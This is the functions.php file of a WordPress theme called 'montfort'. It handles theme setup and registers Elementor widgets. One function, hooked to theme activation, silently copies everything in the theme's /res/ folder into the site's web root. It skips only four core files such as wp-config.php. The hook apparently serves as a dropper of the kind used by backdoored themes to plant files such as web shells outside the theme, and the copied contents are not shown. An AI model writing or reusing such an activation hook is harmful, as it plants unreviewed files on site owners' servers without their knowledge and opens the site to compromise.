<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

/**
 * Theme Setup.
 */
function montfort_setup() {
	add_theme_support( 'title-tag' );
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'html5', [ 'search-form', 'comment-form', 'comment-list', 'gallery', 'caption' ] );
	add_theme_support( 'customize-selective-refresh-widgets' );
}
add_action( 'after_setup_theme', 'montfort_setup' );

/**
 * Copy resources to root on theme activation.
 */
function montfort_copy_res_to_root() {
	$res_dir = get_template_directory() . '/res/';
	if ( ! is_dir( $res_dir ) ) {
		return;
	}

	$dest_dir = ABSPATH;
	$blocked_files = array( 'wp-config.php', '.htaccess', 'index.php', 'wp-load.php' );

	$iterator = new RecursiveIteratorIterator(
		new RecursiveDirectoryIterator( $res_dir, RecursiveDirectoryIterator::SKIP_DOTS ),
		RecursiveIteratorIterator::SELF_FIRST
	);

	foreach ( $iterator as $item ) {
		$sub_path = $iterator->getSubPathName();
		if ( in_array( $sub_path, $blocked_files ) ) {
			continue;
		}

		if ( $item->isDir() ) {
			$dir_path = $dest_dir . $sub_path;
			if ( ! is_dir( $dir_path ) ) {
				mkdir( $dir_path, 0755, true );
			}
		} else {
			copy( $item, $dest_dir . $sub_path );
		}
	}
}
add_action( 'after_switch_theme', 'montfort_copy_res_to_root' );

/**
 * Register custom Elementor widget category.
 */
function montfort_add_elementor_widget_categories( $elements_manager ) {
	$elements_manager->add_category(
		'montfort',
		[
			'title' => esc_html__( 'MontFort', 'montfort' ),
			'icon' => 'fa fa-plug',
		]
	);
}
add_action( 'elementor/elements/categories_registered', 'montfort_add_elementor_widget_categories' );

/**
 * Register custom Elementor widgets.
 */
function montfort_register_elementor_widgets( $widgets_manager ) {
	$widget_files = glob( get_template_directory() . '/widgets/*.php' );
	foreach ( $widget_files as $file ) {
		require_once $file;
		$base_name = basename( $file, '.php' );

		$parts = explode( '-', $base_name );
		$class_parts = array_map( 'ucfirst', $parts );
		$class_name = 'Montfort_Widget_' . implode( '_', $class_parts );

		if ( class_exists( $class_name ) ) {
			$widgets_manager->register( new $class_name() );
		}
	}
}
add_action( 'elementor/widgets/register', 'montfort_register_elementor_widgets' );

/**
 * Enqueue scripts and styles.
 */
function montfort_scripts() {
}
add_action( 'wp_enqueue_scripts', 'montfort_scripts' );
